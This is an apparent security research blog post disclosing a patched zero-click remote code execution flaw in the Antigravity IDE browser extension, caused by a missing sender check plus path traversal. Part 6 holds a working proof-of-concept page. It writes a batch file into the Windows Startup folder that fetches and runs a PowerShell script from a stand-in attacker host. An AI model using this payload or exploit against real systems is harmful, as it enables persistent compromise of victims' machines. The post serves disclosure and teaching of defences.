<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero-Click RCE in Google DeepMind's Antigravity</title>
    <meta name="description" content="Any website you visit could silently write files anywhere on your system. A critical vulnerability analysis.">
    <link rel="stylesheet" href="../../style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
</head>
<body>
    <div class="progress-bar" id="progressBar"></div>

    <nav class="navbar">
        <div class="nav-content">
            <a href="../../" class="logo">Security Research</a>
            <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
                <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="5"></circle>
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"></path>
                </svg>
                <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                </svg>
            </button>
        </div>
    </nav>

    <article class="article">
        <header class="article-header">
            <div class="article-meta">
                <span class="tag critical">Critical Vulnerability</span>
                <span class="tag">Zero-Click</span>
                <span class="tag">RCE</span>
            </div>
            <h1 class="article-title">Zero-Click RCE in Google DeepMind's Antigravity</h1>
            <p class="article-subtitle">Any website you visit could silently write files anywhere on your system.</p>
            <div class="article-info">
                <time datetime="2025-11-27">November 27, 2025</time>
                <span class="separator">|</span>
                <span>25 min read</span>
                <span class="separator">|</span>
                <span>CVSS 9.8</span>
            </div>
        </header>

        <aside class="toc-container">
            <div class="toc" id="toc">
                <h3>Table of Contents</h3>
                <nav id="tocNav"></nav>
            </div>
        </aside>

        <div class="article-content">
            <section id="introduction">
                <h2>Introduction</h2>
                <p>So Google dropped this new AI tool called Antigravity. It's not your typical chatbot â€” this thing can actually control your browser. Click buttons, fill forms, navigate around. Pretty cool, but also kinda terrifying when you think about it.</p>
                <p>I got curious and started poking around the browser extension. What I found was bad: any website you visit could silently write files anywhere on your computer. No clicks. No warnings. Nothing.</p>
                <p>Just visiting a sketchy page could drop malware into your Startup folder. Next reboot? You're owned.</p>
                <div class="callout callout-danger">
                    <strong>Impact:</strong> Visiting a malicious webpage could drop an executable into your Windows Startup folder, achieving persistent code execution on next reboot.
                </div>
            </section>

            <section id="architecture">
                <h2>Part 1: How This Thing Works</h2>
                <p>Google launched Antigravity IDE on November 18, 2025. It's basically VS Code but with AI agents baked in. These agents can write code, edit files, run terminal commands, and â€” here's the fun part â€” control your browser. Ask it to do something on a webpage and it'll pop open Chrome, click around, fill forms, whatever. The whole thing gets recorded as a video.</p>
                <p>I wanted to understand how it all worked under the hood. Time to reverse engineer this thing.</p>

                <h3>Starting Point: What Tools Does It Have?</h3>
                <p>First thing I did was ask the agent to show me its own system instructions. Here's what it gave me:</p>
                <pre><code class="language-plaintext">Tool: browser_subagent
Start a browser subagent to perform actions in the browser with the given task
description. The subagent has access to tools for both interacting with web page
content (clicking, typing, navigating, etc) and controlling the browser window
itself (resizing, etc).

Note: All browser interactions are automatically recorded and saved as WebP
videos to the artifacts directory.</code></pre>
                <p>Interesting. So it's not calling <code>click()</code> directly â€” it spawns a whole sub-agent to handle browser stuff. The main agent just says "go to Google" and the sub-agent figures out the rest.</p>

                <h3>Tracing the Processes</h3>
                <p>Okay, if there's a browser window popping up, something must be running it. Let's check what's going on:</p>
                <pre><code class="language-bash">$ ps aux | grep Chrome
/Applications/Google Chrome.app/Contents/MacOS/Google Chrome \
  --remote-debugging-port=9222 \
  --user-data-dir=/Users/user/.gemini/antigravity-browser-profile \
  --disable-fre --no-default-browser-check</code></pre>
                <p>Bingo. Chrome with <strong>remote debugging on port 9222</strong>. That's the Chrome DevTools Protocol (CDP). Let's poke it:</p>
                <pre><code class="language-bash">$ curl http://127.0.0.1:9222/json/version
{"Browser":"Chrome/131.0.6778.0","Protocol-Version":"1.3",...}</code></pre>
                <p>Following the process tree, I found what's controlling everything:</p>
                <pre><code class="language-bash">$ ps -ef | grep language_server
/Applications/Antigravity.app/.../language_server_macos_arm \
  --extension_server_port 53410 \
  --api_server_url http://jetski-server.corp.goog \
  --csrf_token [REDACTED]</code></pre>

                <p><strong>"Jetski"</strong> â€” that's Google's internal codename for this project. The Language Server is listening on a bunch of ports:</p>

                <div class="table-wrapper">
                    <table>
                        <thead>
                            <tr>
                                <th>Port</th>
                                <th>Purpose</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr><td>53410</td><td>Extension Server (gRPC-Web, CSRF protected)</td></tr>
                            <tr><td>53412-53413</td><td>LSP channels for code intelligence</td></tr>
                            <tr><td>53422</td><td>Additional service channel</td></tr>
                            <tr><td>9222</td><td>Chrome DevTools Protocol</td></tr>
                        </tbody>
                    </table>
                </div>

                <h3>Cracking the Binary</h3>
                <p>The Language Server is a compiled Go binary. No source code to read, but Go binaries are notorious for keeping debug strings around. A quick <code>strings</code> dump revealed some juicy filenames:</p>
                <pre><code class="language-bash">$ strings language_server_macos_arm | grep -i "cortex/handlers" | head -10
third_party/jetski/cortex/handlers/browser_subagent_handler.go
third_party/jetski/cortex/handlers/browser_click_element_handler.go
third_party/jetski/cortex/handlers/browser_press_key_handler.go
third_party/jetski/cortex/handlers/browser_scroll_handler.go
third_party/jetski/cortex/handlers/capture_browser_screenshot_handler.go
third_party/jetski/cortex/handlers/read_browser_page_handler.go</code></pre>
                <p>No source, but who needs it when you've got the handler names? From this I could piece together how it's all structured.</p>

                <h3>The Big Picture</h3>
                <p>Here's what the whole architecture looks like:</p>
                <pre><code class="language-plaintext">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Antigravity IDE (VS Code Fork)                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      â”‚
                      â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Jetski Server + Gemini Model                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      â”‚
                      â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Language Server (Cortex) - gRPC-Web, File System       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      â”‚
                      â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Browser Extension  âš ï¸  externally_connectable: all_urls â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      â”‚
                      â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Chrome Browser (CDP on port 9222)                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</code></pre>

                <h3>All The Tools</h3>
                <p>By grepping for patterns like <code>browser.</code> and <code>fs.</code>, I mapped out all the tools this thing has access to:</p>
                <div class="tool-grid">
                    <div class="tool-category">
                        <h4>Browser Navigation</h4>
                        <ul>
                            <li>browser.open_url</li>
                            <li>browser.click_element</li>
                            <li>browser.press_key</li>
                            <li>browser.select_option</li>
                            <li>browser.input</li>
                        </ul>
                    </div>
                    <div class="tool-category">
                        <h4>Browser Scrolling</h4>
                        <ul>
                            <li>browser.scroll</li>
                            <li>browser.scroll_up</li>
                            <li>browser.scroll_down</li>
                        </ul>
                    </div>
                    <div class="tool-category">
                        <h4>Browser Capture</h4>
                        <ul>
                            <li>browser.get_dom</li>
                            <li>browser.read_page</li>
                            <li>browser.capture_screenshot</li>
                            <li>browser.capture_console</li>
                            <li>browser.execute_javascript</li>
                        </ul>
                    </div>
                    <div class="tool-category">
                        <h4>File System</h4>
                        <ul>
                            <li>fs.view_file_range</li>
                            <li>fs.list_directory</li>
                            <li>fs.write_file</li>
                            <li>fs.delete_knowledge_path</li>
                        </ul>
                    </div>
                </div>
            </section>

            <section id="red-flag">
                <h2>Part 2: The Red Flag</h2>
                <p>Whenever I look at a browser extension, the first thing I check is <code>manifest.json</code>. It tells you everything about what the extension can do and who it trusts.</p>
                <p>One line made me stop and stare:</p>
                <pre><code class="language-json">{
  "externally_connectable": {
    "matches": ["&lt;all_urls&gt;"]
  }
}</code></pre>
                <div class="callout callout-warning">
                    This configuration means <strong>every website on the internet</strong> can send messages directly to this extension using <code>chrome.runtime.sendMessage()</code>.
                </div>
                <p>Most extensions either don't use this at all, or lock it down to specific domains. Setting it to <code>&lt;all_urls&gt;</code> basically says: <em>"Any website on the internet can talk to me."</em></p>
                <p>For an extension that can write files to disk? That's... concerning.</p>
            </section>

            <section id="attack-surface">
                <h2>Part 3: What Can We Call?</h2>
                <p>So any website can send messages to this extension. But what can those messages actually do?</p>

                <h3>The Exposed API</h3>
                <p>After digging through the code, I found these message handlers:</p>
                <ul>
                    <li><code>rpcCall.*</code> â€” UI control functions (Low risk)</li>
                    <li><code>getCurrentTabId</code>, <code>getMimeType</code> â€” Tab info (Low risk)</li>
                    <li><code>CHECK_JETSKI_CONNECTION</code> â€” Reveals if Antigravity is running (Info leak)</li>
                    <li><strong><code>SaveScreenRecording</code> â€” Writes files to disk (CRITICAL)</strong></li>
                </ul>
            </section>

            <section id="vulnerability">
                <h2>Part 4: The Bug</h2>
                <p>That <code>SaveScreenRecording</code> handler is supposed to save screen recordings from the extension's internal offscreen document. It takes:</p>
                <ul>
                    <li><code>za</code> â€” File contents as a byte array</li>
                    <li><code>filename</code> â€” The name of the file to create</li>
                    <li><code>L</code> â€” A path component for organizing recordings</li>
                </ul>
                <p>These get sent to the Language Server, which writes the file here:</p>
                <pre><code class="language-plaintext">C:\Users\{username}\.gemini\antigravity\brain\{L}\{filename}</code></pre>

                <div class="callout callout-danger">
                    <strong>The problem?</strong> It never checks who sent the message.
                </div>

                <div class="comparison-box">
                    <div class="comparison-item expected">
                        <h4>Expected Flow</h4>
                        <div class="flow">
                            <span class="node safe">Offscreen Document (Trusted)</span>
                            <span class="arrow">â†’</span>
                            <span class="node safe">Service Worker (Validates)</span>
                            <span class="arrow">â†’</span>
                            <span class="node">Language Server</span>
                            <span class="arrow">â†’</span>
                            <span class="node">Disk</span>
                        </div>
                    </div>
                    <div class="comparison-item actual">
                        <h4>Actual Flow</h4>
                        <div class="flow">
                            <span class="node danger">Any Website (Untrusted)</span>
                            <span class="arrow">â†’</span>
                            <span class="node warning">Service Worker (No validation!)</span>
                            <span class="arrow">â†’</span>
                            <span class="node">Language Server</span>
                            <span class="arrow">â†’</span>
                            <span class="node danger">Disk</span>
                        </div>
                    </div>
                </div>

                <p>Here's the actual handler code (deobfuscated):</p>
                <pre><code class="language-javascript">// service-worker.js - SaveScreenRecording handler
case 11:  // SaveScreenRecording
    // Validates message SHAPE, not ORIGIN
    if (!a || typeof a !== "object" ||
        a.action !== "SaveScreenRecording" ||
        typeof a.za !== "object" ||      // Recording data (byte array)
        typeof a.filename !== "string" || // Output filename
        typeof a.L !== "string") {        // Path component
        break;
    }

    // Build protobuf message
    B = new Qg;
    Rg(B, new Uint8Array(a.za));   // File contents - ATTACKER CONTROLLED
    cd(B, 2, a.filename);           // Filename - ATTACKER CONTROLLED
    cd(B, 3, a.L);                  // Path - ATTACKER CONTROLLED

    // Send to Language Server - writes file to disk
    return z(n, dh(B).then(...), 16);</code></pre>
                <p>See that <code>sender</code> parameter? It's passed in but never used. Any website can call this.</p>
            </section>

            <section id="path-traversal">
                <h2>Part 5: Escaping the Directory</h2>
                <p>So we control <code>filename</code> and <code>L</code>. Can we break out of the intended directory?</p>
                <p>Yep. No sanitization whatsoever.</p>

                <div class="path-demo">
                    <div class="path-example normal">
                        <h4>Intended Behavior</h4>
                        <div class="path-breakdown">
                            <span class="path-part base">Base: .gemini/antigravity/brain/</span>
                            <span class="path-part normal">L = 'session123'</span>
                            <span class="path-part normal">filename = 'recording.webm'</span>
                            <span class="path-result">Result: brain/session123/recording.webm</span>
                        </div>
                    </div>
                    <div class="path-example exploit">
                        <h4>Exploited Behavior</h4>
                        <div class="path-breakdown">
                            <span class="path-part base">Base: .gemini/antigravity/brain/</span>
                            <span class="path-part danger">L = '../../../Desktop'</span>
                            <span class="path-part danger">filename = 'payload.bat'</span>
                            <span class="path-resolution">Path: brain/../../../Desktop/</span>
                            <span class="path-result danger">Result: C:/Users/victim/Desktop/payload.bat</span>
                        </div>
                    </div>
                </div>
                <p>Just throw some <code>../</code> in the <code>L</code> parameter and you can write anywhere the user has permissions.</p>
            </section>

            <section id="code-execution">
                <h2>Part 6: Getting Code Execution</h2>
                <p>Arbitrary file write is nice, but we want code execution. On Windows, that's easy â€” just drop something in the Startup folder. Anything there runs when the user logs in.</p>

                <div class="attack-chain">
                    <div class="chain-step">
                        <span class="step-num">1</span>
                        <span class="step-title">Victim visits malicious page</span>
                        <span class="step-detail">https://evil.com/cats.html</span>
                    </div>
                    <div class="chain-arrow"></div>
                    <div class="chain-step">
                        <span class="step-num">2</span>
                        <span class="step-title">JavaScript sends message</span>
                        <span class="step-detail">chrome.runtime.sendMessage()</span>
                    </div>
                    <div class="chain-arrow"></div>
                    <div class="chain-step">
                        <span class="step-num">3</span>
                        <span class="step-title">Extension forwards to LS</span>
                        <span class="step-detail">No origin validation</span>
                    </div>
                    <div class="chain-arrow"></div>
                    <div class="chain-step">
                        <span class="step-num">4</span>
                        <span class="step-title">File written to Startup</span>
                        <span class="step-detail">Path traversal exploit</span>
                    </div>
                    <div class="chain-arrow"></div>
                    <div class="chain-step danger">
                        <span class="step-num">5</span>
                        <span class="step-title">Next login = RCE</span>
                        <span class="step-detail">Attacker code executes</span>
                    </div>
                </div>

                <p>Zero clicks needed. Just visit a page and you're done.</p>

                <h3>Proof of Concept</h3>
                <div class="video-container">
                    <div class="video-wrapper">
                        <iframe src="https://drive.google.com/file/d/1WJaPxNqA5vAFWytp9_n2yJNU4CH6YgTs/preview" allowfullscreen></iframe>
                    </div>
                    <div class="video-caption">
                        <span class="video-badge">POC Demo</span>
                        <span>Zero-Click RCE Exploitation in Action</span>
                    </div>
                </div>
                <pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Cute Cat Pictures&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Welcome! Loading cats...&lt;/h1&gt;
&lt;script&gt;
// Executes immediately on page load - zero interaction required
const payload = `@echo off
powershell -w hidden -ep bypass -c "IEX(curl http://attacker.com/shell.ps1)"
`;

chrome.runtime.sendMessage("eeijfnjmjelapkebgockoeaadonbchdd", {
    action: "SaveScreenRecording",
    za: Array.from(new TextEncoder().encode(payload)),
    filename: "WindowsUpdate.bat",
    L: "../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
});
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            </section>

            <section id="root-causes">
                <h2>Part 7: Why This Happened</h2>
                <p>Three issues stacked on top of each other:</p>

                <div class="root-causes">
                    <div class="root-cause">
                        <div class="cause-header">
                            <span class="cause-num">1</span>
                            <h4>Overly Permissive External Messaging</h4>
                        </div>
                        <div class="cause-code">
                            <code>externally_connectable: matches: ['&lt;all_urls&gt;']</code>
                        </div>
                        <div class="cause-fix">
                            <strong>Fix:</strong> Restrict to specific trusted domains or remove
                        </div>
                    </div>
                    <div class="root-cause">
                        <div class="cause-header">
                            <span class="cause-num">2</span>
                            <h4>Missing Sender Validation</h4>
                        </div>
                        <div class="cause-code">
                            <code>function qh(message, sender) { /* sender never checked! */ }</code>
                        </div>
                        <div class="cause-fix">
                            <strong>Fix:</strong> Verify sender is trusted offscreen document
                        </div>
                    </div>
                    <div class="root-cause">
                        <div class="cause-header">
                            <span class="cause-num">3</span>
                            <h4>No Path Sanitization</h4>
                        </div>
                        <div class="cause-code">
                            <code>path = base + user_L + user_filename // Direct concatenation!</code>
                        </div>
                        <div class="cause-fix">
                            <strong>Fix:</strong> Canonicalize path, verify stays within bounds
                        </div>
                    </div>
                </div>

                <p>Fix any one of these and the whole chain breaks.</p>
            </section>

            <section id="fix">
                <h2>Part 8: How They Fixed It</h2>
                <p>Google patched it in v1.11.3 by finally checking who's sending the message:</p>

                <pre><code class="language-javascript">// service-worker.js (v1.11.3)
function isAuthorizedSender(sender) {
  return (
    sender.url?.includes("/static/offscreen.html") &&
    sender.id === chrome.runtime.id &&
    !sender.tab
  );
}

// In SaveScreenRecording handler:
if (!isAuthorizedSender(sender)) {
  return { error: "Unauthorized" };
}</code></pre>

                <div class="fix-validation">
                    <h4>New Validation Logic</h4>
                    <div class="validation-checks">
                        <div class="check">
                            <span class="check-icon">&#10003;</span>
                            <span>sender.url includes '/static/offscreen.html'?</span>
                        </div>
                        <div class="check">
                            <span class="check-icon">&#10003;</span>
                            <span>sender.id === chrome.runtime.id?</span>
                        </div>
                        <div class="check">
                            <span class="check-icon">&#10003;</span>
                            <span>!sender.tab? (not from web page)</span>
                        </div>
                    </div>
                </div>

                <p>Now only the extension's own offscreen document can save files.</p>

                <div class="callout callout-warning">
                    <strong>Worth noting:</strong> They didn't fix the path traversal. The <code>filename</code> and <code>L</code> params still go straight to the Language Server without sanitization. They're just trusting the sender check to keep bad actors out.
                </div>
            </section>

            <section id="lessons">
                <h2>Part 9: Takeaways</h2>
                <p>This bug shows a pattern that keeps popping up in AI tools:</p>

                <div class="lessons-grid">
                    <div class="lesson-category">
                        <h4>For Extension Developers</h4>
                        <ul>
                            <li>Treat <code>externally_connectable</code> with caution</li>
                            <li>Always validate message senders</li>
                            <li>Never trust user input for paths</li>
                            <li>Separate internal/external handlers</li>
                            <li>Audit minifier output</li>
                        </ul>
                    </div>
                    <div class="lesson-category">
                        <h4>For Security Researchers</h4>
                        <ul>
                            <li>AI assistants = high-value targets</li>
                            <li>manifest.json reveals trust model</li>
                            <li>Minification obscures but doesn't protect</li>
                            <li>Check for CDP exposure</li>
                        </ul>
                    </div>
                    <div class="lesson-category">
                        <h4>For Users</h4>
                        <ul>
                            <li>Review extension permissions</li>
                            <li>Be cautious with AI system tools</li>
                            <li>Keep extensions updated</li>
                        </ul>
                    </div>
                </div>
            </section>

            <section id="bigger-picture">
                <h2>Part 10: The Bigger Picture</h2>
                <p>Here's what gets me â€” the architecture was actually pretty solid:</p>

                <div class="perspective-box">
                    <div class="perspective sophisticated">
                        <h4>Sophisticated Architecture</h4>
                        <ul>
                            <li>Multi-layer agent orchestration</li>
                            <li>gRPC-Web with CSRF protection</li>
                            <li>Sandboxed browser automation</li>
                        </ul>
                    </div>
                    <div class="perspective-arrow">â†’</div>
                    <div class="perspective reality">
                        <h4>But Reality...</h4>
                        <ul>
                            <li>Single missing sender check</li>
                            <li>Zero clicks required</li>
                            <li class="danger">Full system compromise</li>
                        </ul>
                    </div>
                </div>

                <p>All that engineering, and one missing sender check turned it into a zero-click malware dropper.</p>

                <blockquote class="key-takeaway">
                    <strong>Always verify who's asking. Always sanitize paths. Never trust external input.</strong>
                </blockquote>
            </section>

            <section id="timeline">
                <h2>Timeline</h2>
                <div class="timeline">
                    <div class="timeline-item">
                        <span class="timeline-date">Nov 18, 2025</span>
                        <span class="timeline-event">Antigravity IDE public preview launched</span>
                    </div>
                    <div class="timeline-item">
                        <span class="timeline-date">Nov 19, 2025</span>
                        <span class="timeline-event">Started reverse engineering, figured out the architecture</span>
                    </div>
                    <div class="timeline-item">
                        <span class="timeline-date">Nov 24, 2025</span>
                        <span class="timeline-event">Found the SaveScreenRecording bug</span>
                    </div>
                    <div class="timeline-item fixed">
                        <span class="timeline-date">Nov 25, 2025</span>
                        <span class="timeline-event">Patched with sender validation (v1.11.3)</span>
                    </div>
                    <div class="timeline-item">
                        <span class="timeline-date">Nov 26, 2025</span>
                        <span class="timeline-event">Report marked as duplicate â€” bug bounty life ğŸ¤·</span>
                    </div>
                </div>
            </section>

            <section id="conclusion">
                <h2>Conclusion</h2>
                <p>Browser extension security is nothing new. But when you bolt on AI capabilities â€” screen control, file writes, browser automation â€” the stakes go through the roof.</p>
                <p>This bug was hiding in plain sight. The manifest said "trust everyone." The handler wrote files for anyone who asked. The path was never sanitized. Each piece seems minor alone, but stack them up and you've got zero-click RCE.</p>
                <p>The code was minified but the architecture choices were right there in the manifest. <strong>Always verify who's asking.</strong></p>

                <div class="vulnerability-summary">
                    <div class="summary-item">
                        <span class="summary-label">Extension ID:</span>
                        <code>eeijfnjmjelapkebgockoeaadonbchdd</code>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Vulnerable Version:</span>
                        <span class="version vulnerable">1.11.2</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Fixed Version:</span>
                        <span class="version fixed">1.11.3</span>
                    </div>
                </div>
            </section>
        </div>
    </article>

    <footer class="footer">
        <p>Security Research Blog</p>
    </footer>

    <button class="back-to-top" id="backToTop" aria-label="Back to top">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M18 15l-6-6-6 6"></path>
        </svg>
    </button>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="../../script.js"></script>
</body>
</html>
